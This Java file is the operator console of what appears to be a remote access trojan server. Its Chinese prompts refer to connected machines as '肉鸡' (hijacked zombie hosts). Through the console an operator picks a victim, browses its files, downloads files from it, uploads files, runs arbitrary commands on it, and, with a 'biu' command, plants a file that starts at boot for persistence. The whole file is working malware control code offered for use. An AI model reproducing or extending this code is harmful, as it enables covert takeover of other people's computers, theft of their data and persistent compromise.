package com.server;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class ConnectToClientsThread extends Thread {
	private ArrayList<Baby> babies;

	public ConnectToClientsThread(ArrayList<Baby> babies) {
		// TODO Auto-generated constructor stub

		this.babies = babies;
	}

	public void run() {
		BufferedReader inputFromKeyborad = new BufferedReader(new InputStreamReader(System.in));
		Baby baby;

		while (true) {
			System.out.println("请您输入编号，对其进行控制");
			if (babies.size() != 0) {

				for (int i = 0; i < babies.size(); i++) {
					baby = babies.get(i);
					System.out.println(i + ":" + baby.getSocket().getInetAddress());
				}
				int chooseWho;
				try {
					while (!((chooseWho = Integer.parseInt(inputFromKeyborad.readLine())) <= babies.size())
							|| chooseWho < 0) {
						System.out.println("你的输入有问题，请重新输入");
					}
					baby = babies.get(chooseWho);
					// 标志正在在使用
					baby.isUsing = true;
				} catch (NumberFormatException | IOException e) {
					System.err.println("你的输入有大问题，请重新输入");
					baby = null;
				}
				if (baby != null) {

					System.out.println("昭哥，您已选择" + baby.getSocket().getInetAddress());
					System.out.println("可以选择下面的命令对其进行坏坏的操作：");
					System.out.println("	ls:展示当前所在的文件夹的目录。");
					System.out.println("	cd dir:进入当前文件夹里面dir的目录直接输入索引");
					System.out.println("	down file to path:将当前目录里面的file" + "文件下载到本机的path路径");
					System.out.println("	up file to path:将本机的file文件上传到" + "客户端的当前路径下面");
					System.out.println("	cmd:对当前用户发送cmd指令");
					System.out.println("	biu file to path:上传文件到path，并让其开机自启动");
					System.out.println("	exit:退出对当前肉鸡的操作");
					String temPath = "";
					ArrayList<String> files = new ArrayList<>();
					ArrayList<String> temFiles = null;
					while (true) {
						System.out.println("昭哥，我正在读取您的输入");
						// 输出目前正在工作的目录
						System.out.print(temPath + ":");
						// 0 没有意义，为了避免一些麻烦随便设置的
						String command = "0";
						try {
							command = inputFromKeyborad.readLine();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							System.err.println("读取出错，重新输入试试");
						}
						String[] commands = command.split(" ");
						String choose = commands[0];
						switch (choose) {
						case "ls": 
							if ((files != null) && !(temPath.equals(""))) {
								showFile(files);
							} else {
								System.out.println("请打开一个文件");
							}
							break;
						

						case "cd": 
							// 这里逻辑比较复杂,主要处理文件的多种可能
							if (commands.length >= 2) {
								for (int i = 2; i < commands.length; i++) {
									commands[1] += " " + commands[i];
								}

								if ((files.contains(temPath + "/" + commands[1])) || commands[1].endsWith(":")
										|| commands[1].endsWith("/")) {
									commands[1].trim();
									// 如果是 cd .. 则：
									if (commands[1].equals("..")) {
										int last = temPath.lastIndexOf('/');
										if (last != -1)
											temPath = temPath.substring(0, last);
										commands[1] = "";
										// 若是tempath变成c: d:等时
										if (temPath.endsWith(":"))
											temPath += "/";
									}
									// 如果是 cd c:等则：
									if (commands[1].endsWith(":")) {
										commands[1] += "/";
										temPath = "";
									}

									// 若tempath以/结尾或者cd ..时tempath已变化
									if (temPath.endsWith("/") || commands[1].endsWith(":/") || commands[1].equals("")) {

										temFiles = getFiles(temPath + commands[1], baby);
										if (temFiles != null) {

											files = temFiles;
											// 如果是cd ..的话 tempath 已经变化，如果不是，则：
											if (!commands[1].equals("")) {
												if (temPath.equals(""))
													temPath = commands[1];
												else {
													temPath += commands[1];
												}
											}
										}
									} else {
										temFiles = getFiles(temPath + "/" + commands[1], baby);

										if (temFiles != null) {

											files = temFiles;
											// 如果是cd ..的话 tempath 已经变化，如果不是，则：
											if (!commands[1].equals(""))
												temPath += "/" + commands[1];
										}
									}

								} else {
									System.out.println("cd输入格式错误，请重新输入");
								}
							} else {
								System.out.println("cd输入参数个数有问题");
							}

							break;
						

						case "down":
							try {
								if ((commands.length == 4) && (commands[2].equals("to"))) {
									BufferedWriter writer = baby.getWriter();
									BufferedReader reader = baby.getReader();
									writer.write("server: download\r\n");
									if (temPath.endsWith("/"))
										writer.write(temPath + commands[1] + "\r\n");
									else {
										writer.write(temPath + "/" + commands[1] + "\r\n");
									}
									writer.flush();
									System.out.println("接受响应");
									String response = reader.readLine();
									System.out.println(response);
									if (response.equals("client: download ready")) {
										DownloadThread downloadThread = new DownloadThread(baby, temPath + commands[1],
												commands[3]);
										downloadThread.start();
									} else {
										System.out.println(response);
									}

								} else {
									System.out.println("download格式错误，请重新输入");
								}
							} catch (IOException e) {
								// TODO Auto-generated catch block
								System.err.println("下载出现错误");
								e.printStackTrace();
							}
							break;
						

						case "up": 
							try {
								if ((commands.length == 4) && (commands[2].equals("to"))) {
									BufferedWriter writer = baby.getWriter();
									BufferedReader reader = baby.getReader();

									File file = new File(commands[1]);
									if (file.exists() && !file.isDirectory()) {
										writer.write("server: upload\r\n");
										writer.write(commands[3] + "\r\n");
										writer.flush();
										String response = reader.readLine();

										if (response.equals("client: upload ready")) {
											UploadThread uploadThread = new UploadThread(baby, commands[1],
													commands[3]);
											uploadThread.start();
										} else {
											System.out.println(response);
										}

									} else {
										System.out.println("本地文件不存在");
									}
								} else {
									System.out.println("upload输入格式错误");
								}

							} catch (IOException e) {
								// TODO Auto-generated catch block
								System.err.println("上传出现错误");
								e.printStackTrace();
							}
							break;

						
						case "cmd":
							if (commands.length >= 2) {
								for (int i = 2; i < commands.length; i++) {
									commands[1] += " " + commands[i];

								}
								BufferedWriter writer = baby.getWriter();
								BufferedReader reader = baby.getReader();
								try {
									writer.write("server: cmd\r\n");
									writer.write(commands[1] + "\r\n");
									writer.flush();
									String result;
									if ((result = reader.readLine()).equals("cmd is running")) {
										result = "";
										String buf = "";
										while (!(buf = reader.readLine()).equals("this command is over")) {
											result += buf + "\r\n";

										}
										System.out.println("result :");
										System.out.println(result);

									} else {
										System.out.println(result);
									}
								} catch (IOException e) {
									// TODO Auto-generated catch block
									System.out.println("出错，原因在服务器");
								}

							} else {
								System.out.println("输入格式出错");
							}
							break;
							
						case "biu":
							try {
								if ((commands.length == 4) && (commands[2].equals("to"))) {
									BufferedWriter writer = baby.getWriter();
									BufferedReader reader = baby.getReader();

									File file = new File(commands[1]);
									if (file.exists() && !file.isDirectory()) {
										writer.write("server: biu\r\n");
										writer.write(commands[3] + "\r\n");
										writer.flush();
										String response = reader.readLine();

										if (response.equals("client: upload ready")) {
											UploadThread uploadThread = new UploadThread(baby, commands[1],
													commands[3]);
											uploadThread.start();
										} else {
											System.out.println(response);
										}

									} else {
										System.out.println("本地文件不存在");
									}
								} else {
									System.out.println("upload输入格式错误");
								}

							} catch (IOException e) {
								// TODO Auto-generated catch block
								System.err.println("上传出现错误");
								e.printStackTrace();
							}
							break;

						default:
							System.out.println("输入格式错误，请重新输入");

						}
						if (choose.equals("exit")) {
							System.out.println("退出中");
							// 标志已经不在使用
							baby.isUsing = false;
							baby = null;
							break;
						}

					}

				}

			} else {
				System.out.println("还没有肉鸡接入,输入任意继续扫描");
				try {
					inputFromKeyborad.readLine();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}

	}

	public ArrayList<String> getFiles(String path, Baby baby) {
		ArrayList<String> files = new ArrayList<>();
		try {
			BufferedReader reader = baby.getReader();
			BufferedWriter writer = baby.getWriter();
			writer.write("server: getFiles\r\n");
			writer.write(path + "\r\n");
			writer.flush();
			String response = reader.readLine();
			if (response.equals("client: get dir ready")) {
				while (!(response = reader.readLine()).equals("client: end")) {
					files.add(response);
				}
				files.add(path + "/" + "..");
				return files;
			} else {
				System.out.println(response);
				return null;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println("出现未知错误");
			e.printStackTrace();
			return null;
		}
	}

	public void showFile(ArrayList<String> files) {

		for (String file : files) {
			System.out.println(file);
		}

	}

}
